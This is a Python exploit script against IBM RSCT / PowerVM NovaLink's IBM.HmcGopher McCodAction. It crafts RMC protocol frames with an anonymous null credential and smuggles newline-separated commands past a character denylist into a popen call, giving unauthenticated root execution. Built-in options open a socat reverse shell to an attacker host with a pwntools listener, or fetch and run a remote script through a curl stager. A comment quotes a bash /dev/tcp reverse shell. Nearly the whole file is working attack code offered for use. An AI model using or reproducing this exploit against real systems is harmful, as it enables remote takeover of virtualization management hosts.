#!/usr/bin/env python3
#  IBM RSCT / PowerVM NovaLink  -  IBM.HmcGopher::McCodAction
#  Author: Sean Bales

import argparse, socket, struct, sys, threading, time

MAGIC       = bytes.fromhex("50434d524443")
ACTION_CODE = 0x04000022
CMDNUM      = 0x23                       # McCodAction CmdNum -> CaRunLocalCodCmd
SUBOP       = 0x71                       # IntIn01 sub-op that reaches the console_msg popen
MECHS       = bytes([0x81,0x01, 0,0,0,1, 0,0,0,2])
NULL_CRED   = bytes([0x82,0x02, 0,0,0,0, 0x01,0x01, 0x20,0x0c])   # mech=0 -> anonymous (UNAUTHENT)
CT_INT32, CT_UINT32, CT_CHAR_PTR, CT_BINARY = 2, 3, 8, 9

def _u32(v): return struct.pack("<I", v & 0xffffffff)
def _set(b,o,v): struct.pack_into("<I", b, o, v & 0xffffffff)

def frame(proto, seq, ce):
    h = bytearray(0x20)
    _set(h,0x00,0x20+len(ce)); h[0x04]=proto; h[0x05]=0x02; h[0x06]=0x01
    h[0x08:0x0e]=MAGIC; _set(h,0x10,seq); _set(h,0x14,0x20); _set(h,0x18,1); _set(h,0x1c,0x20)
    return bytes(h)+ce

def _locale():
    strs=[b"C.UTF-8\x00"]*6; data_off=8+7*4; offs=[]; data=bytearray()
    for s in strs: offs.append(data_off+len(data)); data+=s
    offs.append(data_off+len(data)); data+=_u32(0x2e)
    blk=bytearray(_u32(0)*2)
    for o in offs: blk+=_u32(o)
    blk+=data; _set(blk,0,len(blk)); return bytes(blk)

def start_0():
    loc,name=_locale(),b"raven-api\x00\x00\x00\x00"; META=0x60
    loc_off=META; mech_off=loc_off+len(loc); name_off=mech_off+len(MECHS)
    ce=bytearray(name_off+len(name))
    _set(ce,0x00,0);_set(ce,0x04,1);_set(ce,0x0c,0);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff)
    _set(ce,0x20,loc_off);_set(ce,0x24,len(loc));_set(ce,0x28,mech_off);_set(ce,0x2c,len(MECHS))
    _set(ce,0x30,0x019c35);_set(ce,0x38,0x6a2d7311);_set(ce,0x40,0x0003fa84)
    _set(ce,0x44,0xc2);_set(ce,0x48,0xffff);_set(ce,0x4c,0x10);_set(ce,0x50,0xffff)
    ce[loc_off:loc_off+len(loc)]=loc; ce[mech_off:mech_off+len(MECHS)]=MECHS; ce[name_off:name_off+len(name)]=name
    _set(ce,0x00,len(ce)); return bytes(ce)

def _simple(cmd, blob):
    ce=bytearray(0x28+len(blob))
    _set(ce,0x04,cmd);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x20,0x28);_set(ce,0x24,len(blob)); ce[0x28:]=blob; _set(ce,0x00,len(ce)); return bytes(ce)

def _sd(elems):
    n=len(elems); data_off=8+n*16; arr=bytearray(); data=bytearray()
    for t,v in elems:
        if t in (CT_INT32,CT_UINT32): val=_u32(v)+_u32(0)
        else:
            b=(v if isinstance(v,(bytes,bytearray)) else v.encode())
            if t==CT_CHAR_PTR: b=bytes(b)+b"\x00"
            sz=(len(b)+7)&~7; off=data_off+len(data); data+=bytes(b)+b"\x00"*(sz-len(b)); val=_u32(off)+_u32(sz)
        arr+=_u32(t)+_u32(0)+val
    return bytes(_u32(n)+_u32(0)+bytes(arr)+bytes(data))

def mccod_action(cmdargs_bytes):
    name,cls=b"McCodAction",b"IBM.HmcGopher"
    sd=_sd([
        (CT_CHAR_PTR,b"RAVEN"),(CT_INT32,CMDNUM),(CT_CHAR_PTR,b"MT"),(CT_CHAR_PTR,b"9.9.9.9"),
        (CT_CHAR_PTR,b"CMD"),
        (CT_CHAR_PTR, cmdargs_bytes),        # [5] CmdArgs -> validateCommandArg -> popen console_msg
        (CT_CHAR_PTR,b"x"),(CT_CHAR_PTR,b"a"),(CT_CHAR_PTR,b"b"),
        (CT_UINT32,SUBOP),(CT_UINT32,0),(CT_BINARY,b"\x00"),
    ])
    name_off=0x48+len(sd); cls_off=name_off+len(name)+1
    tail=bytearray(sd+name+b"\x00"+cls+b"\x00"); tail+=b"\x00"*((-(0x48+len(tail)))%8)
    ce=bytearray(0x48)+tail
    _set(ce,0x04,ACTION_CODE);_set(ce,0x10,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x14,0x48);_set(ce,0x18,len(sd));_set(ce,0x20,cls_off);_set(ce,0x34,name_off);_set(ce,0x3c,len(sd))
    _set(ce,0x00,len(ce)); return bytes(ce)

def _recv(s,dl):
    def rd(n):
        b=b""
        while len(b)<n:
            try: s.settimeout(max(0.05,dl-time.time())); c=s.recv(n-len(b))
            except OSError: break
            if not c: break
            b+=c
        return b
    h=rd(4)
    if len(h)<4: return b""
    n=struct.unpack("<I",h)[0]; return h+(rd(n-4) if 0<n<=0x40000 else b"")

def fire(host, port, cmdargs_bytes):
    """CmdArgs is placed verbatim into the SD -> validateCommandArg -> popen."""
    chain=[start_0(), _simple(0x2d,MECHS), _simple(0x02,NULL_CRED), mccod_action(cmdargs_bytes)]
    s=socket.create_connection((host,port),timeout=8); dl=time.time()+20
    for i,ce in enumerate(chain[:-1]):
        s.sendall(frame(0x10,i+1,ce))
        if not _recv(s,dl): s.close(); sys.exit(f"[-] handshake stalled at step {i}")
    s.sendall(frame(0x10,4,chain[-1])); r=_recv(s,dl); s.close(); return r

DENY = set(";|&$`<>(){}[]!*?~")   # validateCommandArg denylist (also applied to the injected line)

def build_payload(cmd):
    # marker line eats "spcodcmd --console_msg ", newline splits, <cmd> runs, trailing newline
    # eats the " &" tail. <cmd> must be denylist-clean (no ; | & $ ` < > ( ) { } [ ] ! * ? ~).
    # cmd may contain newlines -> multiple injected lines, each still denylist-checked as one string.
    return b"probeA\n" + cmd.encode() + b"\n"

def check_clean(cmd, label):
    # newline is NOT on the denylist, so multi-line payloads are fine; check the rest.
    bad=DENY & set(cmd)
    if bad: sys.exit(f"[-] {label} contains denylisted char(s) {sorted(bad)}; the injected command is "
                     f"itself filtered by validateCommandArg. Reverse shells therefore cannot use "
                     f"redirection/pipes/subshells; use socat (-s) or the download stager (--stager).")
    return cmd

def revshell_socat(lh, lp):
    # socat is denylist-clean: only letters/digits/space and ' , / . : (none on the denylist).
    # pty,stderr,setsid,sigint,sane allocates a real TTY, so the pwntools side gets a proper shell.
    return f"socat tcp:{lh}:{lp} exec:'bash -li',pty,stderr,setsid,sigint,sane"

def revshell_stager(url):
    # For hosts without socat: nc here has no -e. Newlines split the payload into 2 denylist-clean
    # lines; the fetched script is NOT filtered, so it can be any full reverse shell.
    #   Serve it:  printf 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n' > r; python3 -m http.server 8000
    return f"curl -s -o /tmp/.r {url}\nbash /tmp/.r"

def pop_shell(lport, fire_thunk):
    # Built-in listener + interactive shell, so no separate catcher is needed. The exploit is fired
    # from a daemon thread (the RM's popen blocks for the life of the shell); the main thread accepts
    # the connect-back and hands you the TTY.
    try:
        from pwn import listen, context
    except ImportError:
        sys.exit("[-] -s needs pwntools:  pip install --break-system-packages pwntools")
    context.log_level = "info"
    l = listen(int(lport))
    threading.Thread(target=fire_thunk, daemon=True).start()
    l.wait_for_connection()
    l.interactive()

if __name__=="__main__":
    ap=argparse.ArgumentParser(description="PATH A: validateCommandArg newline-injection bypass (unauth root)")
    ap.add_argument("host"); ap.add_argument("port",nargs="?",type=int,default=657)
    ap.add_argument("-c",metavar="CMD",help="root command to run (must avoid shell metachars: ; | & $ ` < > ( ) etc.)")
    ap.add_argument("-s",metavar="LHOST:LPORT",help="socat reverse shell with a built-in pwntools listener; drops you into a root shell")
    ap.add_argument("--stager",metavar="URL",help="download+run a script (host:port/path) via curl+bash, for socat-less hosts")
    a=ap.parse_args()
    if a.s:
        lh,lp=a.s.rsplit(":",1)
        payload=build_payload(check_clean(revshell_socat(lh,lp),"-s target"))
        print(f"[*] target {a.host}:{a.port}  reverse shell -> {a.s}  (listener built in)")
        print(f"[*] CmdArgs = {payload!r}")
        pop_shell(lp, lambda: fire(a.host,a.port,payload))
        sys.exit(0)
    if a.stager:
        cmd=check_clean(revshell_stager(a.stager),"--stager URL")
        print(f"[*] stager: curl {a.stager} -> /tmp/.r -> bash (serve your rev-shell script at that URL)")
    else:
        cmd=check_clean(a.c or "touch /tmp/PATH_A_PWNED","-c command")
        print(f"[*] root command: {cmd!r}")
    payload=build_payload(cmd)
    print(f"[*] target {a.host}:{a.port}  CmdArgs = {payload!r}")
    fire(a.host,a.port,payload)